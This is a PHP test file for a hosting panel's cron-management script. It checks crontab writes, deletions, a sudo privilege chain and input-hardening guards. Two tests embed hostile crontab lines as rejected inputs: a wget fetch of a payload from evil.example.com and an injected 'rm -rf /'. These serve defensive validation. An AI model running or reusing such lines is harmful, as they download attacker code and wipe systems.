<?php

// tests/Feature/CronJobs/CronJobSystemTest.php
//
// Real system integration tests gated behind LARANODE_SYSTEM_TESTS=1.
// Verifies that laranode-cron.sh actually writes to the real per-user crontab.
//
// Run inside the local-dev container:
//   LARANODE_SYSTEM_TESTS=1 php artisan test --filter=CronJobSystemTest
//
// Pre-requisites (provisioned by local-dev/entrypoint-setup.sh):
//   - testuser_ln and testuser2_ln system accounts exist.
//   - laranode-scripts/bin/laranode-cron.sh is executable.
//   - /etc/sudoers.d/laranode-cron grants www-data NOPASSWD for the script.
//   - The process user (root in the container) may run crontab -u <user>.

use App\Models\CronJob;
use App\Models\User;
use App\Services\CronJobs\CreateCronJobService;
use App\Services\CronJobs\DeleteCronJobService;
use Illuminate\Support\Facades\Config;

// Gate: skip the entire file unless LARANODE_SYSTEM_TESTS is set.
beforeEach(function () {
    if (! env('LARANODE_SYSTEM_TESTS')) {
        $this->markTestSkipped('LARANODE_SYSTEM_TESTS not set — skipping system integration tests.');
    }

    // Point the service at the bind-mounted scripts so tests are not coupled to
    // the /opt/laranode/bin copy that may be stale from the last `make up`.
    Config::set('laranode.laranode_bin_path', base_path('laranode-scripts/bin'));
});

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/**
 * Read the real crontab for a system user. Returns '' when empty (no crontab).
 */
function readCrontab(string $systemUser): string
{
    return shell_exec('crontab -l -u '.escapeshellarg($systemUser).' 2>/dev/null') ?? '';
}

/**
 * Wipe all laranode-managed lines from a system user's crontab (cleanup helper).
 * Uses the script itself so the cleanup is authoritative.
 */
function clearCrontab(string $systemUser): void
{
    $script = base_path('laranode-scripts/bin/laranode-cron.sh');
    exec('bash '.escapeshellarg($script).' remove '.escapeshellarg($systemUser).' 2>/dev/null');
}

/**
 * Run laranode-cron.sh directly (without sudo) with the given args.
 * Returns ['exitCode' => int, 'output' => string].
 */
function runCronSh(array $args): array
{
    $script = base_path('laranode-scripts/bin/laranode-cron.sh');
    $cmd = 'bash '.escapeshellarg($script);
    foreach ($args as $a) {
        $cmd .= ' '.escapeshellarg($a);
    }

    $out = [];
    $code = 0;
    exec($cmd.' 2>&1', $out, $code);

    return ['exitCode' => $code, 'output' => implode("\n", $out)];
}

/**
 * Run laranode-cron.sh via sudo as www-data (validates the production sudo chain).
 * Returns ['exitCode' => int, 'output' => string].
 */
function runCronShViaSudo(array $args): array
{
    $script = base_path('laranode-scripts/bin/laranode-cron.sh');
    $cmd = 'sudo -u www-data '.escapeshellarg($script);
    foreach ($args as $a) {
        $cmd .= ' '.escapeshellarg($a);
    }

    $out = [];
    $code = 0;
    exec($cmd.' 2>&1', $out, $code);

    return ['exitCode' => $code, 'output' => implode("\n", $out)];
}

// ---------------------------------------------------------------------------
// Test 1: CreateCronJobService writes the entry to the real crontab
// ---------------------------------------------------------------------------
test('CreateCronJobService writes cron entry to real crontab for testuser_ln', function () {
    // Ensure a clean starting state.
    clearCrontab('testuser_ln');

    // Create a User whose systemUsername resolves to testuser_ln.
    $user = User::factory()->isNotAdmin()->create([
        'username' => 'testuser',
        'email' => 'testuser@laranode.system.test',
    ]);

    expect($user->systemUsername)->toBe('testuser_ln');

    $job = CronJob::create([
        'user_id' => $user->id,
        'schedule' => '*/5 * * * *',
        'command' => 'php /home/testuser_ln/artisan inspire',
        'active' => true,
    ]);

    (new CreateCronJobService)->handle($user);

    $crontab = readCrontab('testuser_ln');

    // Use str_contains via toBeTrue so the message is preserved correctly
    // (toContain(..., message) would treat the message as a second needle in Pest 3).
    expect(str_contains($crontab, $job->command))
        ->toBeTrue('crontab must contain the job command. Got: '.json_encode($crontab));

    expect(str_contains($crontab, '# laranode-managed'))
        ->toBeTrue('crontab must include the # laranode-managed marker. Got: '.json_encode($crontab));

    expect(str_contains($crontab, '*/5 * * * *'))
        ->toBeTrue('crontab must contain the schedule. Got: '.json_encode($crontab));

    // Cleanup: remove managed entries so subsequent test runs start clean.
    clearCrontab('testuser_ln');
})->group('system');

// ---------------------------------------------------------------------------
// Test 2: CreateCronJobService then DeleteCronJobService → entry removed
// ---------------------------------------------------------------------------
test('DeleteCronJobService removes cron entry from real crontab for testuser2_ln', function () {
    clearCrontab('testuser2_ln');

    $user = User::factory()->isNotAdmin()->create([
        'username' => 'testuser2',
        'email' => 'testuser2@laranode.system.test',
    ]);

    expect($user->systemUsername)->toBe('testuser2_ln');

    $job = CronJob::create([
        'user_id' => $user->id,
        'schedule' => '0 3 * * *',
        'command' => 'php /home/testuser2_ln/artisan schedule:run',
        'active' => true,
    ]);

    // First: create — entry should appear in crontab.
    (new CreateCronJobService)->handle($user);
    $crontabAfterCreate = readCrontab('testuser2_ln');
    expect(str_contains($crontabAfterCreate, $job->command))
        ->toBeTrue('entry must appear after create. Got: '.json_encode($crontabAfterCreate));

    // Second: delete — entry should be removed.
    (new DeleteCronJobService)->handle($user, $job);
    $crontabAfterDelete = readCrontab('testuser2_ln');
    expect(str_contains($crontabAfterDelete, $job->command))
        ->toBeFalse('entry must be absent after delete. Got: '.json_encode($crontabAfterDelete));

    // Cleanup.
    clearCrontab('testuser2_ln');
})->group('system');

// ---------------------------------------------------------------------------
// Test 3: Script handles an empty tmp file gracefully (exit 0, empty crontab)
// ---------------------------------------------------------------------------
test('laranode-cron.sh set with empty tmp file exits 0 and produces empty crontab', function () {
    clearCrontab('testuser_ln');

    // Create an empty tmp file (mode 0600 before writing, no TOCTOU).
    $oldUmask = umask(0177);
    $tmpFile = tempnam(sys_get_temp_dir(), 'laranode_cron_empty_');
    umask($oldUmask);

    // Ensure the file is actually empty.
    file_put_contents($tmpFile, '');

    try {
        $result = runCronSh(['set', 'testuser_ln', $tmpFile]);

        expect($result['exitCode'])
            ->toBe(0, 'Script must exit 0 on empty tmp file. Output: '.$result['output']);

        // After setting an empty file, the crontab should be empty (no crash).
        $crontab = readCrontab('testuser_ln');
        expect($crontab)->toBe('', 'Crontab must be empty after setting with empty file');

    } finally {
        @unlink($tmpFile);
        clearCrontab('testuser_ln');
    }
})->group('system');

// ---------------------------------------------------------------------------
// Test 4: Script rejects a non-_ln target user (user validation fires)
// ---------------------------------------------------------------------------
test('laranode-cron.sh set rejects a non-_ln target user with non-zero exit', function () {
    $oldUmask = umask(0177);
    $tmpFile = tempnam(sys_get_temp_dir(), 'laranode_cron_guard_');
    umask($oldUmask);
    file_put_contents($tmpFile, '');

    try {
        $result = runCronSh(['set', 'notanln_user', $tmpFile]);

        expect($result['exitCode'])
            ->not->toBe(0, 'Script must exit non-zero for a non-_ln user');

        expect(str_contains($result['output'], 'must end in _ln'))
            ->toBeTrue('Script must emit the _ln validation error. Output: '.$result['output']);

    } finally {
        @unlink($tmpFile);
    }
})->group('system');

// ---------------------------------------------------------------------------
// Test 5 (bash hardening): Script rejects argument starting with dash
// ---------------------------------------------------------------------------
test('laranode-cron.sh rejects argument starting with dash (flag-smuggling guard)', function () {
    $result = runCronSh(['-u', 'testuser_ln']);

    expect($result['exitCode'])
        ->not->toBe(0, 'Script must exit non-zero when first arg starts with dash');

    expect(str_contains($result['output'], "may not start with '-'"))
        ->toBeTrue('Script must emit flag-smuggling error. Output: '.$result['output']);
})->group('system');

// ---------------------------------------------------------------------------
// Test 6 (bash hardening): Script rejects disallowed command in tmp file
// ---------------------------------------------------------------------------
test('laranode-cron.sh rejects disallowed command (wget) in tmp file', function () {
    $oldUmask = umask(0177);
    $tmpFile = tempnam(sys_get_temp_dir(), 'laranode_cron_disallowed_');
    umask($oldUmask);
    // Write a line with wget — not in the php-only allowlist
    file_put_contents($tmpFile, "* * * * *\twget https://evil.example.com/payload.sh\n");

    try {
        $result = runCronSh(['set', 'testuser_ln', $tmpFile]);

        expect($result['exitCode'])
            ->not->toBe(0, 'Script must exit non-zero for disallowed command. Output: '.$result['output']);

        expect(str_contains($result['output'], 'command not allowed'))
            ->toBeTrue('Script must emit command-not-allowed error. Output: '.$result['output']);

    } finally {
        @unlink($tmpFile);
    }
})->group('system');

// ---------------------------------------------------------------------------
// Test 7 (bash hardening): Script rejects crontab line with embedded newline injection
// ---------------------------------------------------------------------------
test('laranode-cron.sh rejects tmp file line that fails 5-field schedule validation', function () {
    $oldUmask = umask(0177);
    $tmpFile = tempnam(sys_get_temp_dir(), 'laranode_cron_inject_');
    umask($oldUmask);
    // First line is valid; second line is a bare command without 5-field schedule prefix.
    // laranode-cron.sh must reject the second line as invalid format.
    file_put_contents(
        $tmpFile,
        "* * * * *\tphp /home/testuser_ln/artisan inspire\nrm -rf /\n"
    );

    try {
        $result = runCronSh(['set', 'testuser_ln', $tmpFile]);

        expect($result['exitCode'])
            ->not->toBe(0, 'Script must exit non-zero for injected bare command. Output: '.$result['output']);

        // Either the format check or the allowlist check fires — both are non-zero.
        expect(str_contains($result['output'], 'invalid crontab line format') || str_contains($result['output'], 'command not allowed'))
            ->toBeTrue('Script must emit a validation error. Output: '.$result['output']);

    } finally {
        @unlink($tmpFile);
    }
})->group('system');

// ---------------------------------------------------------------------------
// Test 8: www-data sudo chain — the production privilege path is exercised
// ---------------------------------------------------------------------------
test('www-data can invoke laranode-cron.sh via the sudoers drop-in (sudo chain validation)', function () {
    // Verify /etc/sudoers.d/laranode-cron is installed.
    $dropIn = '/etc/sudoers.d/laranode-cron';
    expect(file_exists($dropIn))
        ->toBeTrue("$dropIn must exist — install it via entrypoint-setup.sh");

    // Run the script as www-data through the sudo chain to prove NOPASSWD works.
    $result = runCronShViaSudo(['list', 'testuser_ln']);

    expect($result['exitCode'])
        ->toBe(0, 'www-data must be able to run laranode-cron.sh via sudo. Output: '.$result['output']);
})->group('system');
